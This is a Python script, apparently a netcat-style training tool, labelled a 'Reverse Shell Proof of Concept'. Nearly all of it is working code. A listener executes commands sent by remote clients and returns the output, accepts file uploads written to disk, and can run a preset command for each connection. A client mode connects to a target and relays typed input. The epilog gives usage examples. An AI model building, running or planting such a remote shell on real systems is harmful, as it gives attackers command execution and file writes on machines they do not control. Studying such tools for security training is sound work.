import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd),
                                     stderr=subprocess.STDOUT)
    return output.decode()


class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            print("[*] Listening mode")
            self.listen()
        else:
            print("[*] Sending mode")
            self.send()

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            print("[*] Sending from buffer:" + str(self.buffer))
            self.socket.send(self.buffer)

        while True:
            try:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
            except KeyboardInterrupt:
                print('[*] User terminated')
                self.socket.close()
                sys.exit()

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(10)
        print(f'[*] Listening on {self.args.target}:{self.args.port}')
        try:
            while True:
                client, address = self.socket.accept()
                print(f"[*] Accepted connection from {address[0]}:{address[1]}")
                client_thread = threading.Thread(target=self.handle, args=(client,))
                client_thread.start()
        except KeyboardInterrupt:
           print("[*] Terminating")
           client.close()
           print("[*] Terminated")
           sys.exit()

    def handle(self, client_socket):
        if self.args.execute:
            print("[*] Execute mode")
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        elif self.args.upload:
            print("[*] File upload mode")
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'[*] Save file {self.args.upload}'
            client_socket.send(message.encode())
        elif self.args.command:
            print("[*] Command mode")
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'>')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(4096)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'[*] Server killed {e}')
                    if self.socket is not None:
                        self.socket.close()
                    sys.exit()


if __name__ == '__main__':
    print("[*] Starting Reverse Shell")
    parser = argparse.ArgumentParser(
        description="Reverse Shell Proof of Concept",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""Example:
            reverse_shell.py --target <HOST_IP_ADDRESS> --port <HOST_PORT> --listen --command
            reverse_shell.py --target <HOST_IP_ADDRESS> --port <HOST_PORT> --listen --upload=<FILE> 
            reverse_shell.py --target <HOST_IP_ADDRESS> --port <HOST_PORT> --listen --execute=\"<EXECUTE_COMMAND>" 
            reverse_shellpy --target <HOST_IP_ADDRESS> --port <HOST_PORT> 
        """))
    parser.add_argument("-c", "--command", action="store_true", help="enter reverse shell mode")
    parser.add_argument("-e", "--execute", help="command to execute")
    parser.add_argument("-l", "--listen", action="store_true", help="listen mode")
    parser.add_argument("-p", "--port", type=int, help="target port")
    parser.add_argument("-t", "--target", help="target IP address")
    parser.add_argument("-u", "--upload", help="file to upload")
    args = parser.parse_args()

    if args.listen:
        buffer = ''
    else:
        # You will need to use CONTROL+D to enter the
        # shell in order to send commands after connecting.
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()

